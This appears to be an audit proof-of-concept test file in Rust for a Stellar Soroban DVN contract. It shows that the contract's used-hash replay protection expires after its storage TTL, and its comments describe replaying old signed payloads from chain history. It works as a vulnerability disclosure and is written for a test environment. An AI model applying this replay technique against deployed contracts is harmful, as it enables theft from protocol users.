// ============================================================
// FINDING 1 PoC — DVN Replay Protection Bypass via TTL Expiry
// ============================================================
//
// FILE PLACEMENT:
//   contracts/protocol/stellar/contracts/workers/dvn/src/tests/replay_ttl.rs
//
// ALSO: Add this line to
//   contracts/protocol/stellar/contracts/workers/dvn/src/tests/mod.rs
//
//   pub mod replay_ttl;
//
// TERMINAL COMMAND (from contracts/protocol/stellar/):
//   cargo test -p dvn tests::replay_ttl -- --nocapture
//
// ============================================================

extern crate std;

use crate::{dvn::LzDVN, storage::DvnStorage, tests::setup::VID};
use soroban_sdk::{
    testutils::{storage::Persistent as _, Address as _, Ledger as _},
    BytesN, Env,
};
use utils::ttl_configurable::{TtlConfig, TtlConfigStorage, LEDGERS_PER_DAY};

/// FINDING 1: UsedHash TTL Expiry Enables Signature Replay
///
/// Root cause: DvnStorage::UsedHash is a #[persistent] entry.
/// After 30+ days with no access, it expires and returns its
/// default value (false), as if the hash was never used.
/// An attacker can then re-submit the original signed payload
/// (same vid, same expiration still in the future, same calls,
/// same secp256k1 signatures from chain history) and it passes.
#[test]
fn test_used_hash_returns_false_after_ttl_expiry() {
    let env = Env::default();
    env.mock_all_auths();

    // Register the DVN contract (needed for as_contract context)
    use soroban_sdk::{vec, Address, Vec};
    let key_pairs: std::vec::Vec<crate::tests::key_pair::KeyPair> =
        (0..2).map(|_| crate::tests::key_pair::KeyPair::generate()).collect();

    let mut signers: soroban_sdk::Vec<BytesN<20>> = vec![&env];
    key_pairs.iter().for_each(|kp| signers.push_back(kp.signer(&env)));

    let admins: Vec<Address> = vec![&env, Address::generate(&env)];
    let supported_msglibs: Vec<Address> = vec![&env, Address::generate(&env)];
    let price_feed = Address::generate(&env);
    let worker_fee_lib = Address::generate(&env);
    let deposit_address = Address::generate(&env);

    let contract_id = env.register(
        LzDVN,
        (
            &VID,
            &signers,
            &2u32, // threshold = 2
            &admins,
            &supported_msglibs,
            &price_feed,
            &10000u32, // default_multiplier_bps
            &worker_fee_lib,
            &deposit_address,
        ),
    );

    // The hash we are simulating as "already used"
    let replay_hash: BytesN<32> = BytesN::from_array(&env, &[0xde, 0xad, 0xbe, 0xef,
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
        0xde, 0xad, 0xbe, 0xef]);

    // -------------------------------------------------------
    // STEP 1: Simulate __check_auth storing the hash as used
    // (this is exactly what __check_auth does after successful auth)
    // -------------------------------------------------------
    env.as_contract(&contract_id, || {
        // Configure TTL: threshold = 29 days, extend_to = 30 days (protocol defaults)
        let default_ttl = TtlConfig::new(29 * LEDGERS_PER_DAY, 30 * LEDGERS_PER_DAY);
        TtlConfigStorage::set_persistent(&env, &default_ttl);

        // Store the hash as used — exactly what __check_auth does
        DvnStorage::set_used_hash(&env, &replay_hash, &true);

        // Confirm it is marked as used immediately after storage
        let is_used = DvnStorage::used_hash(&env, &replay_hash);
        assert!(is_used, "Hash should be used immediately after set");
        std::println!("[Step 1] Hash stored as used: {}", is_used);
    });

    // -------------------------------------------------------
    // STEP 2: Advance ledger by 31 days — beyond 30-day TTL.
    // The persistent entry expires and is removed from ledger.
    // -------------------------------------------------------
    let current_seq = env.ledger().sequence();
    env.ledger().with_mut(|li| {
        // Move 31 * LEDGERS_PER_DAY forward in sequence
        li.sequence_number = current_seq + (31 * LEDGERS_PER_DAY);
    });
    std::println!("[Step 2] Ledger advanced by 31 days (past 30-day TTL)");

    // -------------------------------------------------------
    // STEP 3: Read the hash again.
    // Because the persistent entry expired, the storage macro
    // returns the #[default(false)] value — as if never used.
    // -------------------------------------------------------
    let result_after_expiry = env.as_contract(&contract_id, || {
        DvnStorage::used_hash(&env, &replay_hash)
    });

    std::println!("[Step 3] used_hash after expiry: {} (expected: false)", result_after_expiry);
    std::println!();
    std::println!("VULNERABILITY CONFIRMED:");
    std::println!("  - Hash was stored as 'true' after first use");
    std::println!("  - After 31 days of inactivity, entry expired");
    std::println!("  - used_hash() now returns false (default)");
    std::println!("  - __check_auth would NOT return HashAlreadyUsed");
    std::println!("  - Attacker replays original signed payload → executes again");
    std::println!("  - Breaks invariant: 'DVN cannot suffer a replay attack'");

    assert!(
        !result_after_expiry,
        "FINDING 1 CONFIRMED: UsedHash expired and returns false. \
         Replay attack is now possible — same signed payload can be re-executed."
    );
}

/// Secondary check: confirms that without TTL config set, the entry also
/// expires at the Soroban network default TTL (not extended indefinitely).
/// This shows the protocol cannot rely on the network default alone.
#[test]
fn test_used_hash_with_no_ttl_config_also_expires() {
    let env = Env::default();
    env.mock_all_auths();

    use soroban_sdk::{vec, Address, Vec};
    let key_pairs: std::vec::Vec<crate::tests::key_pair::KeyPair> =
        (0..1).map(|_| crate::tests::key_pair::KeyPair::generate()).collect();

    let mut signers: soroban_sdk::Vec<BytesN<20>> = vec![&env];
    key_pairs.iter().for_each(|kp| signers.push_back(kp.signer(&env)));

    let admins: Vec<Address> = vec![&env, Address::generate(&env)];
    let supported_msglibs: Vec<Address> = vec![&env, Address::generate(&env)];

    let contract_id = env.register(
        LzDVN,
        (
            &VID,
            &signers,
            &1u32,
            &admins,
            &supported_msglibs,
            &Address::generate(&env),
            &10000u32,
            &Address::generate(&env),
            &Address::generate(&env),
        ),
    );

    let hash: BytesN<32> = BytesN::from_array(&env, &[0xaa; 32]);

    // Store the hash and record its initial TTL
    let initial_ttl = env.as_contract(&contract_id, || {
        DvnStorage::set_used_hash(&env, &hash, &true);
        env.storage().persistent().get_ttl(&DvnStorage::UsedHash(hash.clone()))
    });

    std::println!("[Info] Initial TTL of UsedHash entry: {} ledgers", initial_ttl);
    std::println!("[Info] This will eventually expire — replay window opens after expiry");

    // Advance past the default TTL
    let seq = env.ledger().sequence();
    env.ledger().with_mut(|li| {
        li.sequence_number = seq + initial_ttl + 1;
    });

    let value_after = env.as_contract(&contract_id, || {
        DvnStorage::used_hash(&env, &hash)
    });

    std::println!("[Result] used_hash after TTL+1: {}", value_after);
    assert!(
        !value_after,
        "FINDING 1 (secondary): UsedHash expired at network default TTL. \
         Replay protection window closes, enabling replay of any signed payload."
    );
}
